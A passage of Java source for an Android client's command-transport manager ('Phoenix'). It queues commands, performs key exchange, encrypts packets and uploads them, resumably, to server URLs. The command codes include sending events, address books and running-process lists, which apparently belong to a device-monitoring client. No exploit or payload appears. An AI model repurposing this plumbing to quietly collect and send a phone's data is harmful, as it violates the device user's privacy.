package com.vvt.phoenix.prot;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.security.InvalidKeyException;
import java.util.Iterator;
import java.util.concurrent.PriorityBlockingQueue;

import android.database.sqlite.SQLiteException;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.Message;
import android.os.Process;
import android.util.Log;

import com.vvt.async.AsyncCallback;
import com.vvt.async.NullListenerException;
import com.vvt.http.Http;
import com.vvt.http.HttpListener;
import com.vvt.http.request.HttpRequest;
import com.vvt.http.request.MethodType;
import com.vvt.http.response.HttpResponse;
import com.vvt.logger.FxLog;
import com.vvt.phoenix.config.Customization;
import com.vvt.phoenix.prot.command.CommandCode;
import com.vvt.phoenix.prot.command.CommandData;
import com.vvt.phoenix.prot.command.CommandMetaData;
import com.vvt.phoenix.prot.command.response.RAskResponse;
import com.vvt.phoenix.prot.command.response.ResponseData;
import com.vvt.phoenix.prot.databuilder.PayloadType;
import com.vvt.phoenix.prot.databuilder.ProtocolPacketBuilder;
import com.vvt.phoenix.prot.databuilder.ProtocolPacketBuilderResponse;
import com.vvt.phoenix.prot.parser.ResponseParser;
import com.vvt.phoenix.prot.session.SessionInfo;
import com.vvt.phoenix.prot.session.SessionManager;
import com.vvt.phoenix.prot.unstruct.KeyExchangeResponse;
import com.vvt.phoenix.prot.unstruct.UnstructuredManager;
import com.vvt.phoenix.util.ByteUtil;
import com.vvt.phoenix.util.IOStreamUtil;

/**
 * @author tanakharn
 * @version 1.0
 * @created 13-Aug-2010 2:42:18 PM
 * Refactoring: January 2012
 */
public class CommandServiceManager extends AsyncCallback<CommandListener>{
	
	//Debugging
	private static final String TAG = "CommandServiceManager";
	private static final boolean DEBUG = true;
	private static final boolean LOCAL_DEBUG = (Customization.DEBUG)? DEBUG : false;
	/**
	 * 
	 * @param cmd
	 * @param dataProvider
	 * @param listener
	 */	
	// Members
	private static CommandServiceManager mInstance;
	private static SessionManager mSessionManager;
	private static PriorityBlockingQueue<Request> mQueue; 
	private static CommandExecutor mExecutor;
	private static String mUnstructuredUrl;
	private static String mStructuredUrl;
			
	private CommandServiceManager(String databaseDirectoryPath, String payloadDirectoryPath, 
			String unstructuredUrl, String structuredUrl){
		mSessionManager = new SessionManager(databaseDirectoryPath, payloadDirectoryPath);
		mUnstructuredUrl = unstructuredUrl;
		mStructuredUrl = structuredUrl;
		mQueue = new PriorityBlockingQueue<Request>();
		mExecutor = new CommandExecutor();
		
	}
	
	
	/**
	 * Initiate CommandServiceManager instance.
	 * Throws IllegalArgumentException if argument is null.
	 * Throws SQLiteException if cannot open or create session database.
	 * 
	 * @param databaseDirectoryPath - Absolute path of directory which will store session database.
	 * @param payloadDirectoryPath - Absolute path of directory which will store payload files.
	 * @param unstructuredUrl - URL for unstructured commands.
	 * @param structuredUrl - URL for structured commands.
	 * @return Single instance of CommandServiceManager
	 * 
	 */
	public static CommandServiceManager getInstance(String databaseDirectoryPath, String payloadDirectoryPath, 
			String unstructuredUrl, String structuredUrl) {//throws Exception{
		
		//validate input
		if(databaseDirectoryPath == null){
			FxLog.w(TAG, "> getInstance # Database directory path is null");
			throw new IllegalArgumentException("Database directory path is null");
		}
		if(payloadDirectoryPath == null){
			FxLog.w(TAG, "> getInstance # Payload directory path is null");
			throw new IllegalArgumentException("Payload directory path is null");
		}
		if(unstructuredUrl == null){
			FxLog.w(TAG, "> getInstance # Unstructured URL is null");
			throw new IllegalArgumentException("Unstructured URL is null");
		}
		if(structuredUrl == null){
			FxLog.w(TAG, "> getInstance # Strucuted URL is null");
			throw new IllegalArgumentException("Strucuted URL is null");
		}
		
		
		if(mInstance == null){
			mInstance = new CommandServiceManager(databaseDirectoryPath, payloadDirectoryPath, unstructuredUrl, structuredUrl);
			try{
				mSessionManager.openOrCreateSessionDatabase();
				//for test handle open session database error
				/*if(true){
					throw new SQLiteException("Dummy Exception while open session DB");
				}*/
			}catch(SQLiteException e){
				FxLog.e(TAG, String.format("> getInstance # %s", e.getMessage()));
				mInstance = null;
				throw e;
			}
		}
		
		return mInstance;
	}
		
	public void setUnStructuredUrl(String url){
		mUnstructuredUrl = url;
	}
	
	public void setStructuredUrl(String url){
		mStructuredUrl = url;
	}
		
	/**
	 * Execute the given request with Phoenix engine.
	 * Throws IllegalArgumentException if argument is null.
	 * @param command - CommandRequest
	 * @return CSID for the input request or -1 if error.
	 */
	public synchronized long execute(CommandRequest command){
		
		//1 validate input
		if(command == null){
			FxLog.w(TAG, "> execute # Command Request is NULL");
			throw new IllegalArgumentException("Command Request is NULL");
		}
		CommandMetaData meta = command.getMetaData();
		CommandData data = command.getCommandData();
		if(meta == null){
			FxLog.w(TAG, "> execute # Meta Data is NULL");
			throw new IllegalArgumentException("Meta Data is NULL");
		}
		if(data == null){
			FxLog.w(TAG, "> execute # Command Data is NULL");
			throw new IllegalArgumentException("Command Data is NULL");
		}
				
		//2 create session
		SessionInfo session = mSessionManager.createSession(command);
		
		//3 create NewRequest
		NewRequest newRequest = new NewRequest();
		newRequest.setCsid(session.getCsid());
		newRequest.setPayloadPath(session.getPayloadPath());
		newRequest.setCommandRequest(command);
		newRequest.setPriority(command.getPriority());
		
		
		//4 check and set Transport Directive Type for this request
		int directive;
		//for test invalid command code
		//switch(-1){
		switch(data.getCmd()){
			case CommandCode.UNKNOWN_OR_RASK						: 	return -1;
			case CommandCode.SEND_EVENT								:	directive = TransportDirectives.RESUMABLE;break;
			case CommandCode.SEND_ACTIVATE							:	directive = TransportDirectives.NON_RESUMABLE;break;
			case CommandCode.SEND_DEACTIVATE						:	directive = TransportDirectives.NON_RESUMABLE;break;
			case CommandCode.SEND_HEARTBEAT							:	directive = TransportDirectives.NON_RESUMABLE;break;
			case CommandCode.REQUEST_CONFIGURATION					:	directive = TransportDirectives.NON_RESUMABLE;break;
			case CommandCode.GETCSID								:	directive = TransportDirectives.NON_RESUMABLE;break;
			case CommandCode.CLEARSID								:	directive = TransportDirectives.NON_RESUMABLE;break;
			case CommandCode.REQUEST_ACTIVATION_CODE				:	directive = TransportDirectives.NON_RESUMABLE;break;
			case CommandCode.GET_ADDRESS_BOOK						:	directive = TransportDirectives.NON_RESUMABLE;break;
			case CommandCode.SEND_ADDRESS_BOOK_FOR_APPROVAL			:	directive = TransportDirectives.RESUMABLE;break;
			case CommandCode.SEND_ADDRESS_BOOK						:	directive = TransportDirectives.RESUMABLE;break;
			case CommandCode.GET_COMMU_MANAGER_SETTINGS				:	directive = TransportDirectives.NON_RESUMABLE;break;
			case CommandCode.GET_TIME								:	directive = TransportDirectives.NON_RESUMABLE;break;
			case CommandCode.SEND_MESSAGE							:	directive = TransportDirectives.NON_RESUMABLE;break;
			case CommandCode.GET_PROCESS_WHITE_LIST					:	directive = TransportDirectives.NON_RESUMABLE;break;
			case CommandCode.SEND_RUNNING_PROCESS					:	directive = TransportDirectives.NON_RESUMABLE;break;
			case CommandCode.GET_PROCESS_BLACK_LIST					:	directive = TransportDirectives.NON_RESUMABLE;break;
			default:	return -1;
		}
		newRequest.setTransportDirective(directive);
		
		//5 persist Resumable Session
		if(directive == TransportDirectives.RESUMABLE){
			try{
				if(!mSessionManager.persistSession(session)){
					FxLog.w(TAG, "> execute # Cannot persist resumable session. Ignore this request and return -1");
					return -1;
				}
			}catch(RuntimeException e){
				FxLog.e(TAG, String.format("> execute # %s", e.getMessage()));
				return -1;
			}
		}
		
		//6 put NewRequest to Queue
		//for test add queue error
		//if(false){
		if(mQueue.add(newRequest)){
			FxLog.v(TAG, "> execute # New Request has been added to queue");
		}else{
			FxLog.w(TAG, "> execute # Cannot add New Reqeust to queue");
			if(directive == TransportDirectives.RESUMABLE){
				if(!mSessionManager.deleteSession(session.getCsid())){
					FxLog.w(TAG, "> execute # Cannot delete this error request from session DB.");
				}
			}
			return -1;
		}
		
		//7 start CommandExecutor (if IDLE)
		//mExecutor.execute();
		mExecutor.execute(command.getCommandListener());
		
		//8 return CSID
		return session.getCsid();		
	}
	
	/**
	 * Cancel the Request that currently processing in Command Executor then
	 * push the given Request into Request queue and begin processing next Request.
	 * It isn't guarantee that the given Request will be the next Request that Command Executor 
	 * processes. You've to set priority of the Request to HIGHEST for make sure 
	 * that it will be add to the front line of Request queue.
	 * 
	 * Caller who own the canceled Request will be notified via onCancel() call back.
	 * 
	 * @param request
	 * @return CSID of the new request.
	 */
	/*public long cancelAndExecute(CommandRequest request){
		
		//1 generate CSID and return to Caller
		
		//2 Spawn new thread
		
		//3 terminate CE
		
		//4 clear resource of the canceled Request
		
		//5 push new Request into queue
		
		//6 start CE again
		
		return -1;
	}*/
	
	public long[] getAllPendingSessions(){
		
		return mSessionManager.getAllPendingSessionIds();
	}
	
	public long[] getAllOrphanedSessions(){

		return mSessionManager.getAllOrphanSessionIds();
	}
	
	/**
	 * Use this method for delete pending or orphaned sessions before Phoenix Runtime only
	 * @param csid
	 */
	public void deleteSession(long csid){
		/*// delete un-complete payload (if have)
		SessionInfo s = mSessionManager.getSession(csid);
		File f = new File(s.getPayloadPath());
		f.delete();
		// delete session
		mSessionManager.deleteSession(csid);*/
		
		// delete incomplete payload (if exist)
		SessionInfo session = mSessionManager.getSession(csid);
		if(session != null){
			File f = new File(session.getPayloadPath());
			if(f.delete()){
				FxLog.v(TAG, String.format("> deleteSession # %s has been deleted", session.getPayloadPath()));
			}else{
				FxLog.w(TAG, String.format("> deleteSession # Delete %s is unsuccessfully", session.getPayloadPath()));
			}
		}else{
			FxLog.w(TAG, String.format("> deleteSession # Cannot retrieve session for CSID %d", csid));
		}
		
		//delete session
		if(session != null){
			if(mSessionManager.deleteSession(csid)){
				FxLog.i(TAG, String.format("> deleteSession # Session data of CSID %d has been deleted", csid));
			}else{
				FxLog.w(TAG, String.format("> deleteSession # Cannot delete session data of CSID %d", csid));
			}
		}
		
	}
	
	public synchronized long resume(long csid, CommandListener listener){
		if(LOCAL_DEBUG){
			Log.v(TAG, "resuming");
		}
		
		//1 retrieve Session
		SessionInfo session = mSessionManager.getSession(csid);
		//for test handle payloadReady == false
		//session = new SessionInfo();
		if(session == null){
			if(LOCAL_DEBUG){Log.w(TAG, "No Session for CSID: "+csid+", Cant' resume !");}
			return -1;
		}else if(session.isPayloadReady() == false){
			/*
			 * check for ready flag
			 * if the flag is FALSE then return -1 and clear session data
			 */
			FxLog.w(TAG, "> resume # Session is not ready, return -1");
			if(!mSessionManager.deleteSession(csid)){
				FxLog.w(TAG, String.format("> resume # Cannot delete session data for CSID %d", csid));
			}
			return -1;
		}
		
		//2 initiate ResumeRequest
		ResumeRequest request = new ResumeRequest();
		request.setTransportDirective(TransportDirectives.RSEND);
		request.setSession(session);
		request.setCommandListener(listener);
		request.setPriority(CommandPriority.HIGH);
		request.setCsid(csid);
		
		//3 put ResumeRequest to Queue
		mQueue.add(request);
		
		//4 start CommandExecutor
		mExecutor.execute(listener);
		
		return session.getCsid();
	}
		
	public synchronized boolean cancelRequest(long csid){
		FxLog.d(TAG, String.format("> cancelRequest # CSID: %d", csid));
		
		if(deleteRequestFromQueue(csid)){
			FxLog.v(TAG, String.format("> cancelRequest # Request CSID %d has been removed from queue", csid));
		}else if(deleteRequestFromExecutorSession(csid)){
			FxLog.v(TAG, String.format("> cancelRequest # CommandListener for Request CSID %d has been removed from Executor Session", csid));
		}else{
			FxLog.w(TAG, String.format("> cancelRequest # No Request for CSID %d to be removed", csid));
			return false;
		}
		return true;
	}
	
	private boolean deleteRequestFromQueue(long csid){
		FxLog.d(TAG, String.format("> deleteRequestFromQueue # CSID %d", csid));
		Request req;
		Iterator<Request> it = mQueue.iterator();
		while(it.hasNext()){
			req = it.next();
			if(req.getCsid() == csid){
				FxLog.i(TAG, String.format("> deleteRequestFromQueue # Found Request CSID %d in the queue", csid));
				if(mQueue.remove(req)){
					FxLog.v(TAG, String.format("> deleteRequestFromQueue # Request CSID %d has been removed from the queue", csid));
				}else{
					FxLog.w(TAG, String.format("> deleteRequestFromQueue # Removing Reqeust CSID %d from queue is not success", csid));
					return false;
				}
				if(mSessionManager.deleteSession(csid)){
					FxLog.v(TAG, String.format("> deleteRequestFromQueue # Session CSID %d has been removed from Session DB", csid));
				}else{
					FxLog.w(TAG, String.format("> deleteRequestFromQueue # Removing Session CSID %d from Session DB is not success", csid));
				}								
				return true;
			}
		}
		FxLog.w(TAG, String.format("> deleteRequestFromQueue # No Request for CSID %d in the queue", csid));
		return false;
	}
	
	private boolean deleteRequestFromExecutorSession(long csid){
		FxLog.d(TAG, String.format("> deleteRequestFromExecutorSession # CSID %d", csid));
		if(mExecutor.getCurrentWorkingCsid() == csid){
			mExecutor.cancelCurrentRequest();
			FxLog.d(TAG, String.format("> deleteRequestFromExecutorSession # CommandListener for Request CSID %d has been removed from Executor Session. However its operation still running.", csid));
			return true;
		}else{
			FxLog.w(TAG, String.format("> deleteRequestFromExecutorSession # Executor is not working with CSID %d", csid));
			return false;
		}		
	}
	
	@Override
	protected void onAsyncCallbackInvoked(CommandListener listener, int what, Object... results) {
		FxLog.d(TAG, String.format("> onAsyncCallbackInvoked # Thread ID %d", Thread.currentThread().getId()));
		switch (what) {
			case CommandListener.ON_CONSTRUCT_ERROR:
				FxLog.v(TAG, "> onAsyncCallbackInvoked # ON_CONSTRUCT_ERROR");
				long constErrorCsid = (Long) results[0];
				Exception constErrorException = (Exception) results[1];
				listener.onConstructError(constErrorCsid, constErrorException);
				break;
				
			case CommandListener.ON_TRANSPORT_ERROR:
				FxLog.v(TAG, "> onAsyncCallbackInvoked # ON_TRANSPORT_ERROR");
				long transportErrorCsid = (Long) results[0];
				Exception transportErrorException = (Exception) results[1];
				listener.onTransportError(transportErrorCsid, transportErrorException);
				break;
				
			case CommandListener.ON_SERVER_ERROR:
				FxLog.v(TAG, "> onAsyncCallbackInvoked # ON_SERVER_ERROR");
				ResponseData serverErrorResponse = (ResponseData) results[0];
				listener.onServerError(serverErrorResponse);
				break;
				
			case CommandListener.ON_SUCCESS:
				FxLog.v(TAG, "> onAsyncCallbackInvoked # ON_SUCCESS");
				ResponseData successResponse = (ResponseData) results[0];
				listener.onSuccess(successResponse);
				break;
		}
		
	}

	private class CommandExecutor extends HandlerThread	implements HttpListener{
		
		private static final int HTTP_TIME_OUT = (3*60*1000);	// 3 minutes
		
		
		/*
		 * States
		 */
		private static final int IDLE = 0;
		private static final int PROCESS_NEXT_REQUEST = 1;
		private static final int REQUEST_KEY_EXCHANGE = 2;
		private static final int BUILD_NEW_REQUEST_PROTOCOL_PACKET = 3;
		private static final int SEND_AND_RECEIVE = 4;
		private static final int PROCESS_RESPONSE = 5;
		private static final int NOTIFY_SUCCESS = 6;
		private static final int CLEAR_RESOURCE = 7;
		private static final int REQUEST_RASK = 8;
		private static final int BUILD_RESUME_REQUEST_PROTOCOL_PACKET = 9;
		
		/*
		 * Members
		 */
		private Handler mHandler;
		private ExecutorSession mExecutorSession;
		
		/**
		 * @author Tanakharn
		 * Hold state and data of current Request for processing inside CommandExecutor.
		 */
		private class ExecutorSession{
			private int currentState;
			private boolean isNewRequest;
			private CommandListener commandListener;
			private long csid;
			private long ssid;
			private NewRequest newRequest;
			private ResumeRequest resumeRequest;
			private int byteRecieved;
			private SessionInfo sessionInfo;
			private ProtocolPacketBuilderResponse packetBuilderResponse;
			private ByteArrayOutputStream httpResponseStream;
			
			public void clearWorkbench(){
				currentState = IDLE;
				isNewRequest = true;
				commandListener = null;
				csid = -1;
				ssid = -1;
				newRequest = null;
				resumeRequest = null;
				byteRecieved = -1;
				sessionInfo = null;
				packetBuilderResponse = null;
				httpResponseStream = null;
			}
		}
		
		public CommandExecutor(String name, int priority) {
			super(name, priority);
			this.start();
			mHandler = new Handler(this.getLooper()){
				@Override
				public void handleMessage(Message msg){
					super.handleMessage(msg);
					switch(msg.what){
					
						case PROCESS_NEXT_REQUEST:
							processingNextRequest();
							break;					
								
							default:
								FxLog.w(TAG, "CommandExecutor > handleMessage # Unknown Order");
					}
				}
			};

			mExecutorSession = new ExecutorSession();
			mExecutorSession.clearWorkbench();
		}		
		public CommandExecutor(){
			this("PhoenixCommandExecutor", Process.THREAD_PRIORITY_BACKGROUND);		
		}
		
		// *********************************************** //
		
		private void requestChangeState(int nextState){
			Message msg = mHandler.obtainMessage();
			msg.what = nextState;
			msg.sendToTarget();
		}
		
		/**
		 * Call this method after initiate Executor or if Executor is in idle state.
		 */
		public void execute(CommandListener listener){
			
			//1 grab caller Thread
			FxLog.v(TAG, "CommandExecutor > execute # Grab caller Thread");
			if(listener != null){
				try {
					addAsyncCallback(listener);
				} catch (NullListenerException e) {
					// unchecked
					FxLog.w(TAG, "CommandExecutor > execute # NullListenerException");
				}
			}else{
				FxLog.w(TAG, "CommandExecutor > execute # Listener is NULL");
			}
			
			//2 check Executor's state
			if(mExecutorSession.currentState == IDLE){
				FxLog.d(TAG, "CommandExecutor > execute # Executor is in IDLE, wake him up !");
				requestChangeState(PROCESS_NEXT_REQUEST);
			}else{
				FxLog.w(TAG, "CommandExecutor > execute # Executor is busy, he will grab your Request after his work is finished.");
			}			
		}
		
		public long getCurrentWorkingCsid(){
			FxLog.d(TAG, String.format("CommandExecutor > getCurrentWorkingCsid # Current CSID: %d", mExecutorSession.csid));
			return mExecutorSession.csid;
		}
		
		public void cancelCurrentRequest(){
			FxLog.d(TAG, "CommandExecutor > cancelCurrentRequest");
			mExecutorSession.commandListener = null;
		}
				
		/**
		 * This method must be synchronized
		 * because it has a race condition with execute()
		 * by setting mCurrentState variable to IDLE.
		 */
		private void processingNextRequest(){
			FxLog.d(TAG, "CommandExecutor > processingNextRequest");
			mExecutorSession.currentState = PROCESS_NEXT_REQUEST;
			
			Request request;
			synchronized (CommandServiceManager.this) {
				mExecutorSession.clearWorkbench();	
				mExecutorSession.currentState = PROCESS_NEXT_REQUEST;  //mExecutorSession.clearWorkbench() will set state back to IDLE then we reset it again.
				request = mQueue.poll();
				if(request == null){
					FxLog.w(TAG, "CommandExecutor > processingNextRequest # Hey man ! Queue is empty, I'm going to IDLE state");
					mExecutorSession.clearWorkbench();	
					//clear all Listener Handler Thread
					clearAllCallback();
				}
			}			
			
			if(request != null){
				switch(request.getRequestType()){
				
					case RequestType.NEW_REQUEST	: 
						FxLog.d(TAG, "CommandExecutor > processingNextRequest # New Request");
						mExecutorSession.isNewRequest = true;
						NewRequest newRequest = (NewRequest) request;
						mExecutorSession.newRequest = newRequest;
						mExecutorSession.commandListener = newRequest.getCommandRequest().getCommandListener();
						mExecutorSession.csid = newRequest.getCsid();
						doKeyExchange();
						break;
						
					case RequestType.RESUME_REQUEST	:
						FxLog.d(TAG, "CommandExecutor > processingNextRequest # Resume Request");
						mExecutorSession.isNewRequest = false;
						ResumeRequest resumeRequest = (ResumeRequest) request;
						mExecutorSession.resumeRequest = resumeRequest;
						mExecutorSession.sessionInfo = resumeRequest.getSession();
						mExecutorSession.commandListener = resumeRequest.getCommandListener();
						mExecutorSession.csid = resumeRequest.getCsid();
						mExecutorSession.ssid = mExecutorSession.sessionInfo.getSsid();
						//for test handle build resume protocol packet error
						//doBuildResumeRequestProtocolPacket();
						doRAsk();
						break;
				}
			}else{
				FxLog.w(TAG, "CommandExecutor > processingNextRequest # Good night");
			}
		}

		// ************************************************* Packet Construction Phase ************************************* //
		
		private void doKeyExchange(){
			FxLog.d(TAG, "CommandExecutor > doKeyExchange");
			mExecutorSession.currentState = REQUEST_KEY_EXCHANGE;
			
			//1 get Session (got null if NON-RESUMABLE)
			mExecutorSession.sessionInfo = mSessionManager.getSession(mExecutorSession.newRequest.getCsid());
			if(mExecutorSession.sessionInfo != null){
				FxLog.v(TAG, "CommandExecutor > doKeyExchange # Session exist in session DB, this is RESUMABLE request");
			}else{
				FxLog.v(TAG, "CommandExecutor > doKeyExchange # Session doesn't exist in session DB, this is NON-RESUMABLE request");
			}
			
			//2 do key exchange
			CommandRequest command = mExecutorSession.newRequest.getCommandRequest();
			UnstructuredManager unstructManager = new UnstructuredManager(mUnstructuredUrl);
			KeyExchangeResponse keyExchnageResponse = unstructManager.doKeyExchange(1, 1);
			  // validate KeyExchangeResponse
			if(keyExchnageResponse.isResponseOk() == false){
				FxLog.w(TAG, String.format("CommandExecutor > doKeyExchange # Key Exchange Error: %s", keyExchnageResponse.getErrorMessage()));
				CommandListener listener = command.getCommandListener();
				if(listener != null){
					invokeAsyncCallback(listener, CommandListener.ON_CONSTRUCT_ERROR, mExecutorSession.newRequest.getCsid(), new Exception(keyExchnageResponse.getErrorMessage()));
				}
				// also delete session data
				if(mExecutorSession.sessionInfo != null){
					if(!mSessionManager.deleteSession(mExecutorSession.sessionInfo.getCsid())){
						FxLog.w(TAG, String.format("CommandExecutor > doKeyExchange # Cannot delete session of CSID %d", mExecutorSession.sessionInfo.getCsid()));
					}
				}
				processingNextRequest();
			}else{
				mExecutorSession.ssid = keyExchnageResponse.getSessionId();
				FxLog.v(TAG, String.format("CommandExecutor > doKeyExchange # Key Exchnage OK, Response SSID: %d", mExecutorSession.ssid));
				doBuildNewRequestProtocolPacket(keyExchnageResponse);
			}
		}
				
		private void doBuildNewRequestProtocolPacket(KeyExchangeResponse keyExchangeResponse){
			FxLog.d(TAG, "CommandExecutor > doBuildProtocolPacket");
			mExecutorSession.currentState = BUILD_NEW_REQUEST_PROTOCOL_PACKET;
			
			CommandRequest command = mExecutorSession.newRequest.getCommandRequest();
			ProtocolPacketBuilder packetBuilder = new ProtocolPacketBuilder();
			try {
				mExecutorSession.packetBuilderResponse = packetBuilder.buildCmdPacketData(command.getMetaData(),
						 command.getCommandData(), mExecutorSession.newRequest.getPayloadPath(), keyExchangeResponse.getServerPK(),
						 keyExchangeResponse.getSessionId(), mExecutorSession.newRequest.getTransportDirective());
				 FxLog.v(TAG, "CommandExecutor > doBuildProtocolPacket # Building protocol OK");
				 //update session (if exist)
				 if(mExecutorSession.sessionInfo != null){
						FxLog.v(TAG, "CommandExecutor > doBuildProtocolPacket # Update session data");
						mExecutorSession.sessionInfo.setSsid(keyExchangeResponse.getSessionId());
						mExecutorSession.sessionInfo.setServerPublicKey(keyExchangeResponse.getServerPK());
						mExecutorSession.sessionInfo.setAesKey(mExecutorSession.packetBuilderResponse.getAesKey().getEncoded());
						mExecutorSession.sessionInfo.setMetaData(command.getMetaData());
						mExecutorSession.sessionInfo.setPayloadSize(mExecutorSession.packetBuilderResponse.getPayloadSize());
						mExecutorSession.sessionInfo.setPayloadCrc32(mExecutorSession.packetBuilderResponse.getPayloadCrc32());
						mExecutorSession.sessionInfo.setPayloadReady(true);
					
						if(mSessionManager.updateSession(mExecutorSession.sessionInfo)){
							doSendAndReceive();
						}else{
							FxLog.w(TAG, "CommandExecutor > doBuildProtocolPacket # Cannot update session data, stop operation");
							CommandListener listener = command.getCommandListener();
							if(listener != null){
								invokeAsyncCallback(listener, CommandListener.ON_CONSTRUCT_ERROR, mExecutorSession.newRequest.getCsid(), new Exception("Cannot update session database"));
							}
							doClearResource(false);
						}
				}else{
					doSendAndReceive();
				}				 
			} catch (Exception e) {
				FxLog.e(TAG, String.format("CommandExecutor > doBuildProtocolPacket # Exception while building protocol: %s", e.getMessage()));
				CommandListener listener = command.getCommandListener();
				if(listener != null){
					invokeAsyncCallback(listener, CommandListener.ON_CONSTRUCT_ERROR, mExecutorSession.newRequest.getCsid(), e);
				}
				doClearResource(false);
			}
		}

		private void doRAsk(){
			mExecutorSession.currentState = REQUEST_RASK;
			
			//1 doRAsk
			RAskAgencry agency = new RAskAgencry(mExecutorSession.sessionInfo, mStructuredUrl);	
			RAskResponse rAskResponse = agency.doRAsk();
			if(rAskResponse == null){
				FxLog.w(TAG, "> doRAsk # Cannot make RAsk request");
				if(mExecutorSession.commandListener != null){
					invokeAsyncCallback(mExecutorSession.commandListener, CommandListener.ON_TRANSPORT_ERROR, 
							mExecutorSession.csid, new Exception("Cannot make RAsk request"));
				}
				processingNextRequest();
			}else{
				
				//2 check status code returned from server
				if(rAskResponse.getStatusCode() != PhoenixResponseCode.OK){
					FxLog.w(TAG, String.format("> doRAsk # Server return error %d", rAskResponse.getStatusCode()));
					if(mExecutorSession.commandListener != null){
						invokeAsyncCallback(mExecutorSession.commandListener, CommandListener.ON_SERVER_ERROR, rAskResponse);
					}
					
					if(eligibleToClearResource(rAskResponse.getStatusCode())){
						doClearResource(true);
					}
				}else{
					FxLog.v(TAG, String.format("> doRAsk # Success, server has received %d bytes", rAskResponse.getNumberOfBytesReceived()));
					mExecutorSession.byteRecieved = rAskResponse.getNumberOfBytesReceived();
					doBuildResumeRequestProtocolPacket();
				}
				
			}
			
		}
		
		private void doBuildResumeRequestProtocolPacket(){
			FxLog.d(TAG, "> doBuildResumeRequestProtocolPacket");
			mExecutorSession.currentState = BUILD_RESUME_REQUEST_PROTOCOL_PACKET;
			ProtocolPacketBuilder packetBuilder = new ProtocolPacketBuilder();
			try {
				mExecutorSession.packetBuilderResponse = packetBuilder.buildResumePacketData(mExecutorSession.sessionInfo.getMetaData(), 
						mExecutorSession.sessionInfo.getPayloadPath(), mExecutorSession.sessionInfo.getServerPublicKey(), 
						mExecutorSession.sessionInfo.getAesKey(), mExecutorSession.sessionInfo.getSsid(), TransportDirectives.RSEND, 
						(int) mExecutorSession.sessionInfo.getPayloadSize(), mExecutorSession.sessionInfo.getPayloadCrc32());
				
				FxLog.v(TAG, "> doBuildResumeRequestProtocolPacket # OK");
				doSendAndReceive();
			} catch (Exception e) {
				FxLog.e(TAG, String.format("> doBuildResumeRequestProtocolPacket # %s", e.getMessage())); 
				if(mExecutorSession.commandListener != null){
					invokeAsyncCallback(mExecutorSession.commandListener, CommandListener.ON_TRANSPORT_ERROR, mExecutorSession.csid, e);
				}
				processingNextRequest();
			}
		}
		
		// ************************************************* Packet Transportation Phase ************************************* //
		
		private void doSendAndReceive(){
			mExecutorSession.currentState = SEND_AND_RECEIVE;
			FxLog.d(TAG, String.format("CommandExecutor > doSendAndReceive - Thread ID %d", Thread.currentThread().getId()));
			
			HttpRequest httpRequest = new HttpRequest();
			httpRequest.setConnectionTimeOut(HTTP_TIME_OUT);
			httpRequest.setContentType(com.vvt.http.request.ContentType.BINARY_OCTET_STREAM);
			httpRequest.setMethodType(MethodType.POST);
			httpRequest.setUrl(mStructuredUrl);
			httpRequest.addDataItem(mExecutorSession.packetBuilderResponse.getMetaDataWithHeader());
			if(mExecutorSession.packetBuilderResponse.getPayloadType() == PayloadType.FILE){
				if(mExecutorSession.isNewRequest){
					FxLog.v(TAG, "> doSendAndReceive # Add File item for New Request type");
					httpRequest.addFileDataItem(mExecutorSession.packetBuilderResponse.getPayloadPath());
				}else{
					FxLog.v(TAG, String.format("> doSendAndReceive # Add File item for Resume Request type with offset %d", mExecutorSession.byteRecieved));
					httpRequest.addFileDataItem(mExecutorSession.packetBuilderResponse.getPayloadPath(), mExecutorSession.byteRecieved);
				}
			}else{
				httpRequest.addDataItem(mExecutorSession.packetBuilderResponse.getPayloadData());
			}
			mExecutorSession.httpResponseStream = new ByteArrayOutputStream();
			Http http = new Http();
			http.execute(httpRequest, this);
		}
		
			// ************************************************* HTTP Callback ************************************* //
		@Override
		public void onHttpConnectError(Exception e) {
			FxLog.e(TAG, String.format("CommandExecutor > onHttpConnectError # %s - Thread ID: %d", e.getMessage(), Thread.currentThread().getId()));
			if(mExecutorSession.commandListener != null){
				invokeAsyncCallback(mExecutorSession.commandListener, CommandListener.ON_TRANSPORT_ERROR, mExecutorSession.csid, e);
			}
			processingNextRequest();
		}
		@Override
		public void onHttpTransportError(Exception e) {
			FxLog.e(TAG, String.format("CommandExecutor > onHttpTransportError # %s - Thread ID: %d", e.getMessage(), Thread.currentThread().getId()));
			if(mExecutorSession.commandListener != null){
				invokeAsyncCallback(mExecutorSession.commandListener, CommandListener.ON_TRANSPORT_ERROR, mExecutorSession.csid, e);
			}
			processingNextRequest();
		}
		@Override
		public void onHttpError(int httpStatusCode, Exception e) {
			FxLog.e(TAG, String.format("CommandExecutor > onHttpError # code: %d, message: %s - Thread ID: %d", httpStatusCode, e.getMessage(), Thread.currentThread().getId()));
			if(mExecutorSession.commandListener != null){
				invokeAsyncCallback(mExecutorSession.commandListener, CommandListener.ON_TRANSPORT_ERROR, mExecutorSession.csid, 
						new Exception(String.format("HTTP %d, %s", httpStatusCode, e.getMessage()), e));
			}
			processingNextRequest();
		}
		@Override
		public void onHttpSentProgress(com.vvt.http.response.SentProgress progress) {
			FxLog.d(TAG, String.format("CommandExecutor > onHttpSentProgress # Sent %d from %d - Thread ID: %d",
					progress.getSentSize(), progress.getTotalSize(), Thread.currentThread().getId()));
			
		}
		@Override
		public void onHttpResponse(HttpResponse response) {
			FxLog.d(TAG, String.format("CommandExecutor > onHttpResponse - Thread ID %d", Thread.currentThread().getId()));
			byte[] responseBody = response.getBody();
			mExecutorSession.httpResponseStream.write(responseBody, 0, responseBody.length);
			
		}
		@Override
		public void onHttpSuccess(HttpResponse response) {
			FxLog.i(TAG, String.format("CommandExecutor > onHttpSuccess # - Thread ID %d", Thread.currentThread().getId()));
			//1 check MIME type
			com.vvt.http.request.ContentType requestMimeType = response.getHttpRequest().getContentType();
			com.vvt.http.request.ContentType responseMimeType = response.getResponseContentType();
			if(requestMimeType != responseMimeType){
				FxLog.w(TAG, "CommandExecutor > onHttpSuccess # Response MIME type doesn't matched with the request");
				if(mExecutorSession.commandListener != null){
					invokeAsyncCallback(mExecutorSession.commandListener, CommandListener.ON_TRANSPORT_ERROR, mExecutorSession.csid, new Exception("MIME type incorrect"));
				}
				processingNextRequest();
			}else{
				//for test handle plaintext response from server
				//_testParsingResponseAsPlainText();
				doProcessResponse();
			}
		}
				
		// ************************************************* End of HTTP Callback ************************************* //
		
		/**
